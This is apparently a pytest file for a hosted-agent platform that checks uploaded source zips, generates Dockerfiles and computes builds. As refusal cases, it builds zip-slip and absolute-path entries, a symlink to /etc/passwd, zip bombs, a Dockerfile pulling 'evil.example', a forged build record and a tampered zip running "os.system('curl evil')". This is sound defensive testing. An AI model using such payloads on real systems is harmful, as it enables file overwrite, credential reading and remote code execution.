"""A hosted agent's source zip (S41-07, ADR 0080 §9): checked at upload, stored by its sha256, and
read again where a zip version is written, which gets a `build` the platform computes."""

from __future__ import annotations

import io
import stat
import zipfile
from collections.abc import Iterator
from typing import Any

import pytest
from choregos_adapters.fakes.storage import FakeObjectStore
from httpx import AsyncClient

from .conftest import login

ORG = "/api/v1/orgs/varga"
SOURCES = f"{ORG}/hosted-sources"
AGENT = "def answer(text):\n    return text\n"


def _zip(files: dict[str, bytes | str], *, mode: dict[str, int] | None = None) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, content in files.items():
            info = zipfile.ZipInfo(name)
            info.compress_type = zipfile.ZIP_DEFLATED
            if mode and name in mode:
                info.external_attr = mode[name] << 16
            archive.writestr(info, content)
    return buffer.getvalue()


AGENT_ZIP = _zip({"main.py": AGENT, "responses_server.py": "...", "requirements.txt": "httpx==0.28.1\n"})


@pytest.fixture
def store() -> Iterator[FakeObjectStore]:
    from choregos_api.object_store import use_object_store

    fake = FakeObjectStore()
    use_object_store(fake)
    yield fake
    use_object_store(None)


def _runtime(sha256: str, **source: Any) -> dict[str, Any]:
    zipped = {"type": "zip", "sha256": sha256, "runtime": "python_3_13", "entry_point": ["python", "main.py"]}
    return {"kind": "hosted", "source": {**zipped, **source}}


async def _upload(client: AsyncClient, data: bytes = AGENT_ZIP) -> Any:
    return await client.post(SOURCES, content=data, headers={"content-type": "application/zip"})


async def _create(client: AsyncClient, runtime: dict[str, Any]) -> Any:
    spec = {"instructions": "Triage {{ ticket.title }}.", "runtime": runtime}
    return await client.post(
        f"{ORG}/agents", json={"slug": "triager", "display_name": "Triager", "spec": spec}
    )


# ───────────────────────── what a zip may hold ─────────────────────────


@pytest.mark.parametrize(
    ("data", "reason"),
    [
        pytest.param(b"not a zip", "not a zip archive", id="not-a-zip"),
        pytest.param(_zip({"../evil.py": "x", "main.py": AGENT}), "goes outside the archive", id="zip-slip"),
        pytest.param(_zip({"a/../../evil.py": "x"}), "goes outside the archive", id="zip-slip-inside"),
        pytest.param(_zip({"/etc/cron.d/x": "x"}), "a relative path", id="absolute"),
        pytest.param(_zip({"dir\\main.py": "x"}), "a relative path", id="backslash"),
        pytest.param(_zip({"C:/main.py": "x"}), "a relative path", id="drive"),
        pytest.param(
            _zip({"main.py": AGENT, "link": "/etc/passwd"}, mode={"link": stat.S_IFLNK | 0o777}),
            "symbolic link",
            id="symlink",
        ),
        pytest.param(
            _zip({"agent/main.py": AGENT, "agent/requirements.txt": ""}), "not the folder", id="nested-root"
        ),
        pytest.param(_zip({}), "holds no file", id="empty"),
        pytest.param(_zip({f"f{n}.py": "" for n in range(2001)}), "2000 at most", id="too-many-files"),
        pytest.param(
            _zip({"main.py": AGENT, "weights.bin": b"\0" * (64 * 1024 * 1024 + 1)}),
            "once uncompressed",
            id="zip-bomb",
        ),
    ],
)
def test_a_zip_that_could_harm_the_build_is_refused(data: bytes, reason: str) -> None:
    from choregos_api.services.hosted_sources import SourceRefused, read_source

    with pytest.raises(SourceRefused, match=reason):
        read_source(data)


def test_an_encrypted_entry_or_a_name_twice_is_refused() -> None:
    from choregos_api.services.hosted_sources import SourceRefused, read_source

    encrypted = bytearray(_zip({"main.py": AGENT}))
    # The general purpose flag of the local header (offset 6) and of the central directory entry.
    encrypted[6] |= 1
    central = encrypted.rfind(b"PK\x01\x02")
    encrypted[central + 8] |= 1
    with pytest.raises(SourceRefused, match="encrypted"):
        read_source(bytes(encrypted))
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("main.py", AGENT)
        archive.writestr("./main.py", "print('the other one')")
    with pytest.raises(SourceRefused, match="twice"):
        read_source(buffer.getvalue())


def test_a_flat_zip_is_read_with_its_digest() -> None:
    import hashlib

    from choregos_api.services.hosted_sources import read_source

    archive = read_source(_zip({"main.py": AGENT, "pkg/mod.py": "", "requirements.txt": ""}))
    assert archive.files == ("main.py", "pkg/mod.py", "requirements.txt")
    assert (
        archive.sha256
        == "sha256:"
        + hashlib.sha256(_zip({"main.py": AGENT, "pkg/mod.py": "", "requirements.txt": ""})).hexdigest()
    )


# ───────────────────────── what a version asks of its zip ─────────────────────────


def _source(**changes: Any) -> Any:
    from choregos_api.schemas import HostedZipSource

    return HostedZipSource.model_validate({**_runtime("sha256:" + "0" * 64)["source"], **changes})


@pytest.mark.parametrize(
    ("files", "changes", "reason"),
    [
        ({"app.py": AGENT, "requirements.txt": ""}, {}, "runs `main.py`, which is not in the archive"),
        ({"main.py": AGENT}, {}, "neither `requirements.txt` nor `pyproject.toml`"),
        (
            {"main.py": AGENT, "requirements.txt": ""},
            {"entry_point": ["./start.sh"]},
            "runs `./start.sh`, which is not in the archive",
        ),
        ({"main.py": AGENT, "requirements.txt": ""}, {"runtime": "node_22"}, "no base image for the runtime"),
    ],
)
def test_a_version_that_its_zip_cannot_run_is_refused(
    files: dict[str, str], changes: dict[str, Any], reason: str
) -> None:
    from choregos_api.services.hosted_sources import SourceRefused, check_against, read_source

    with pytest.raises(SourceRefused, match=reason):
        check_against(read_source(_zip(files)), _source(**changes))


@pytest.mark.parametrize(
    ("files", "changes"),
    [
        ({"main.py": AGENT, "requirements.txt": ""}, {"entry_point": ["python", "-u", "main.py"]}),
        ({"pyproject.toml": ""}, {"entry_point": ["python", "-m", "uvicorn", "app:app"]}),
        ({"serve.py": AGENT}, {"entry_point": ["uvicorn", "serve:app"], "dependency_resolution": "bundled"}),
        ({"main.py": AGENT}, {"dependency_resolution": "bundled"}),
    ],
)
def test_a_version_its_zip_can_run_is_accepted(files: dict[str, str], changes: dict[str, Any]) -> None:
    from choregos_api.services.hosted_sources import check_against, read_source

    check_against(read_source(_zip(files)), _source(**changes))


# ───────────────────────── the Dockerfile the platform writes ─────────────────────────

BASE_313 = (
    "docker.io/library/python:3.13-slim-bookworm"
    "@sha256:a1165e272e578941b84abc79e4ab38a0305cd12803a5c4247979ac7655f4d641"
)
GOLDEN = f"""\
# Written by Choregos (ADR 0080 §9, template 2). The zip's own Dockerfile,
# if it has one, is not read.
FROM {BASE_313}
ARG SOURCE_DATE_EPOCH
ENV PYTHONDONTWRITEBYTECODE=1 PYTHONUNBUFFERED=1 PIP_NO_CACHE_DIR=1 PIP_DISABLE_PIP_VERSION_CHECK=1 PORT=8088
RUN useradd --uid 1000 --create-home agent
WORKDIR /app
COPY requirements.txt /app/requirements.txt
RUN pip install --no-cache-dir -r /app/requirements.txt
COPY . /app
USER 1000
EXPOSE 8088
ENTRYPOINT ["python", "main.py"]
"""


def _hosted(**changes: Any) -> Any:
    from choregos_api.schemas import HostedRuntime

    return HostedRuntime.model_validate(
        {**_runtime("sha256:" + "0" * 64), "source": _source(**changes).model_dump()}
    )


def test_the_dockerfile_is_written_by_the_platform_from_a_pinned_base() -> None:
    from choregos_api.services.hosted_sources import dockerfile, read_source

    assert dockerfile(_hosted(), read_source(AGENT_ZIP)) == GOLDEN


def test_the_dockerfile_follows_the_dependency_mode_and_never_the_zips_own() -> None:
    from choregos_api.services.hosted_sources import dockerfile, read_source

    own = {"Dockerfile": "FROM evil.example/root\nUSER root\n"}
    pyproject = dockerfile(_hosted(), read_source(_zip({"main.py": AGENT, "pyproject.toml": "", **own})))
    assert "RUN pip install --no-cache-dir /app\n" in pyproject
    bundled = dockerfile(
        _hosted(dependency_resolution="bundled"), read_source(_zip({"main.py": AGENT, **own}))
    )
    assert "RUN pip" not in bundled and "ENV PYTHONPATH=/app/site-packages" in bundled
    for text in (pyproject, bundled):
        assert "evil.example" not in text and "USER root" not in text
        (base,) = [line for line in text.splitlines() if line.startswith("FROM")]
        assert base.startswith("FROM docker.io/library/python:3.13-slim-bookworm@sha256:")
        assert "# syntax=" not in text, "a frontend image pulled at build time is unpinned code"
        assert "USER 1000" in text
    argv = dockerfile(_hosted(entry_point=["python", "main.py", '--name="a b"']), read_source(AGENT_ZIP))
    assert argv.endswith('ENTRYPOINT ["python", "main.py", "--name=\\"a b\\""]\n'), "exec form, JSON-quoted"


def test_the_build_key_changes_with_every_input_and_only_with_them(monkeypatch: pytest.MonkeyPatch) -> None:
    import json

    from choregos_api.config import reset_settings_cache
    from choregos_api.services.hosted_sources import pending_build, read_source

    zipped = read_source(AGENT_ZIP)
    first = pending_build(_hosted(), zipped)
    assert first.status == "pending"
    assert pending_build(_hosted(), read_source(AGENT_ZIP)).key == first.key, "same inputs, same key"
    other_zip = read_source(_zip({"main.py": AGENT + "#\n", "requirements.txt": ""}))
    keys = {
        pending_build(_hosted(), other_zip).key,
        pending_build(_hosted(runtime="python_3_12"), zipped).key,
        pending_build(_hosted(dependency_resolution="bundled"), zipped).key,
        pending_build(_hosted(entry_point=["python", "-u", "main.py"]), zipped).key,
    }
    monkeypatch.setenv(
        "CHOREGOS_HOSTED_BASE_IMAGES",
        json.dumps({"python_3_13": "registry.internal/python:3.13@sha256:" + "1" * 64}),
    )
    reset_settings_cache()
    try:
        rebased = pending_build(_hosted(), zipped)
    finally:
        monkeypatch.delenv("CHOREGOS_HOSTED_BASE_IMAGES")
        reset_settings_cache()
    keys.add(rebased.key)
    assert first.key not in keys and len(keys) == 5
    assert rebased.provenance["base_image"] == "registry.internal/python:3.13@sha256:" + "1" * 64
    assert set(first.provenance) == {
        "source",
        "runtime",
        "dependency_resolution",
        "base_image",
        "template",
        "dockerfile",
    }


def test_a_base_image_without_a_digest_is_refused(monkeypatch: pytest.MonkeyPatch) -> None:
    from choregos_api.config import reset_settings_cache
    from choregos_api.services.hosted_sources import SourceRefused, base_image

    monkeypatch.setenv("CHOREGOS_HOSTED_BASE_IMAGES", '{"python_3_13": "python:3.13-slim"}')
    reset_settings_cache()
    try:
        with pytest.raises(SourceRefused, match="not pinned by digest"):
            base_image("python_3_13")
    finally:
        monkeypatch.delenv("CHOREGOS_HOSTED_BASE_IMAGES")
        reset_settings_cache()


# ───────────────────────── through the API ─────────────────────────


async def test_an_upload_is_stored_once_under_its_digest(
    client: AsyncClient, admin: str, store: FakeObjectStore
) -> None:
    first = await _upload(client)
    assert first.status_code == 201, first.text
    body = first.json()
    assert body["files"] == ["main.py", "requirements.txt", "responses_server.py"]
    assert body["dependencies"] == "requirements.txt"
    again = await _upload(client)
    assert again.json()["sha256"] == body["sha256"]
    assert list(store.objects) == [f"hosted-sources/{_org_id(store)}/{body['sha256'][7:]}.zip"]
    read = await client.get(f"{SOURCES}/{body['sha256']}")
    assert read.status_code == 200 and read.json() == body
    assert (await client.get(f"{SOURCES}/sha256:{'e' * 64}")).status_code == 404
    assert await _audited_targets() == [body["sha256"][7:]] * 2


async def _audited_targets() -> list[str]:
    """The uploads' audit targets, checked against their column: SQLite ignores a length that
    PostgreSQL enforces."""
    from choregos_api.db.models import AuditLog
    from choregos_api.db.session import session_scope
    from sqlalchemy import select

    async with session_scope() as db:
        query = select(AuditLog.target_id).where(AuditLog.action == "agent.hosted_source_upload")
        targets = [str(target) for target in (await db.execute(query)).scalars()]
    assert all(len(target) <= AuditLog.__table__.c.target_id.type.length for target in targets)
    return targets


def _org_id(store: FakeObjectStore) -> str:
    (key,) = store.objects
    return key.split("/")[1]


async def test_a_harmful_upload_is_refused_and_not_stored(
    client: AsyncClient, admin: str, store: FakeObjectStore
) -> None:
    refused = await _upload(client, _zip({"../evil.py": "x", "main.py": AGENT}))
    assert refused.status_code == 422 and "outside the archive" in refused.text
    assert store.objects == {}


async def test_an_upload_larger_than_the_cap_is_refused_before_it_is_read_whole(
    client: AsyncClient, admin: str, store: FakeObjectStore
) -> None:
    refused = await _upload(client, b"\0" * (64 * 1024 * 1024 + 1))
    assert refused.status_code == 422 and "larger than 64 MiB" in refused.text
    assert store.objects == {}


async def test_a_member_who_cannot_create_an_agent_cannot_upload(
    client: AsyncClient, admin: str, store: FakeObjectStore
) -> None:
    added = await client.post(f"{ORG}/members", json={"email": "lecteur@varga.dev", "role": "viewer"})
    assert added.status_code in {200, 201}, added.text
    await login(client, "lecteur@varga.dev")
    assert (await _upload(client)).status_code == 403
    assert store.objects == {}


async def test_a_zip_version_gets_the_build_the_platform_computes(
    client: AsyncClient, admin: str, store: FakeObjectStore
) -> None:
    from choregos_api.services.hosted_sources import pending_build, read_source

    sha256 = (await _upload(client)).json()["sha256"]
    forged = {"status": "ready", "key": "sha256:" + "f" * 64, "image": "evil.example/a@sha256:" + "f" * 64}
    created = await _create(client, {**_runtime(sha256), "build": forged})
    assert created.status_code == 201, created.text
    version = (await client.get(f"{ORG}/agents/triager/versions/1")).json()
    build = version["spec"]["runtime"]["build"]
    expected = pending_build(_hosted(), read_source(AGENT_ZIP))
    assert build["status"] == "pending", "a caller never says a build is ready"
    assert build["image"] is None
    assert build["key"] == expected.key
    assert build["provenance"]["source"] == sha256


@pytest.mark.parametrize(
    ("setup", "reason"),
    [
        ("absent", "upload it first"),
        ("tampered", "no longer hashes to its name"),
        ("no_entry_point", "which is not in the archive"),
    ],
)
async def test_a_zip_version_whose_source_cannot_be_built_is_refused(
    client: AsyncClient, admin: str, store: FakeObjectStore, setup: str, reason: str
) -> None:
    sha256 = (await _upload(client)).json()["sha256"]
    runtime = _runtime(sha256)
    if setup == "absent":
        runtime = _runtime("sha256:" + "a" * 64)
    elif setup == "tampered":
        (key,) = store.objects
        store.tamper(key, _zip({"main.py": "import os; os.system('curl evil')", "requirements.txt": ""}))
    else:
        runtime["source"]["entry_point"] = ["python", "app.py"]
    refused = await _create(client, runtime)
    assert refused.status_code == 422, refused.text
    error = refused.json()["errors"][0]
    assert error["loc"] == ["runtime", "source"] and reason in error["msg"]
    assert (await client.get(f"{ORG}/agents/triager")).status_code == 404


async def test_a_zip_runtime_without_a_base_image_is_refused_before_anything_is_read(
    client: AsyncClient, admin: str, store: FakeObjectStore
) -> None:
    refused = await _create(client, _runtime("sha256:" + "a" * 64, runtime="dotnet_10"))
    assert refused.status_code == 422, refused.text
    error = refused.json()["errors"][0]
    assert error["loc"] == ["runtime", "source", "runtime"] and "no base image" in error["msg"]
